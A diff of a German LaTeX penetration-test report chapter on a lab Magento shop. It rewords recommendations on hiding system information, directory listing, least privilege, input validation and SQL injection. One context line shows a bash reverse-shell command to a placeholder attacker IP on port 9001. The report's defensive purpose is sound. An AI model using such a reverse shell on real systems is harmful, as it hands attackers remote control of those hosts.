@@ -1,4 +1,5 @@
 \chapter{Tobold's Pfeifenkraut-Shop}
+Die Webanwendung \textit{Tobold's Pfeifenkraut-Shop} befindet sich unter der IP-Adresse \url{http://10.0.68.100}. Diese Webanwendung ist ein Shop zum Einkauf von Pfeifenkraut. Ein Screenshot der Startseite ist in \autoref{fig:07_pfeifenkraut_shop} dargestellt.
 
 \vfill
 \begin{figure}[!ht]
@@ -22,8 +23,9 @@
 
 \subsection*{Empfehlungen}
 \begin{itemize}
-    \item Informationen über die verwendeten Technologien von der Webanwendung entfernen, Beispielsweise das Magento-Logo im Header entfernen (siehe \cite{owaspSecurityMisconfiguration}).
-    \item Das Directory-Listing deaktivieren und nur die nötigen Dateien erreichbar machen (siehe \cite{owaspSecurityMisconfiguration}).
+    \item Systeminformationen verbergen: Vermeiden Sie es, Systeminformationen, wie z.B. das verwendete CMS-System und dessen Versionsnummer, auf der Webanwendung anzuzeigen. Dies erleichtert Angriffe auf diese Systeme, da so gezielt nach bekannten Schwachstellen gesucht werden kann.
+    \item Deaktivierung des Directory Listings: Deaktivieren Sie das Directory Listing, damit die Inhalte von Verzeichnissen nicht aufgelistet werden (siehe \cite{owaspSecurityMisconfiguration}).
+    \item Einschränkung der Zugriffsrechte: Schränken Sie die Zugriffsrechte aller Dateien so ein, das die ordungsgemäße Nutzung gegeben ist, aber auch nur die nötigsten Zugriffsrechte vergeben sind nach dem Least-Privilege-Prinzip (siehe \cite{owaspSecurityMisconfiguration}).
 \end{itemize}
 
 \cvss{av=local, ac=low, pr=none, ui=required, s=changed, c=high, i=low, a=low}
@@ -40,8 +42,8 @@ Durch die gewonnen Informationen über das verwendete CMS und die ungefähre Ver
 \begin{itemize}
     \item Aktualisieren der Magento-Installation, welche den Patch für diese Schwachstelle beinhaltet (siehe \cite{owaspVulnerableDependency}).
     \item Regelmäßige Updates sind außerdem hilfreich um zukünftig ähnliche Sicherheitsprobleme zu umgehen, da dadurch Sicherheitsupdates regelmäßig durchgeführt werden (siehe \cite{owaspVulnerableDependency}).
-    \item Eingabevalidierung der Benutzereingaben kann ebenfalls Injection-Angriffe wie diese verhindern (Siehe \cite{owaspInputValidation}).
-    \item Im Speziellen für SQL-Injections ist das Verwenden von Paramterized-Queries sinnvoll, da dadurch solche Stacked-SQL-Injection Angriffe verhindert werden können  (Siehe \cite{owaspSQLInjectionPrevention}).
+    \item Eingabevalidierung: Validieren und escapen Sie alle Benutzereingaben, um Injection-Angriffe zu verhindern (siehe \cite{owaspInputValidation}).
+    \item Im Speziellen für SQL-Injections ist das Verwenden von Paramterized-Queries sinnvoll, da dadurch solche Stacked-SQL-Injection Angriffe verhindert werden können  (siehe \cite{owaspSQLInjectionPrevention}).
 \end{itemize}
 
 \cvss{av=network, ac=low, pr=none, ui=required, s=changed, c=high, i=high, a=high}
@@ -71,5 +73,4 @@ bash -c 'bash -i >& /dev/tcp/<Angreifer-IP>/9001 0>&1
 \subsection*{Empfehlungen}
 \begin{itemize}
     \item Updaten der Magento-Version. In den aktuellen Versionen ist die Sicherheitslücke geschlossen (siehe \cite{owaspVulnerableDependency}).
-    
 \end{itemize}
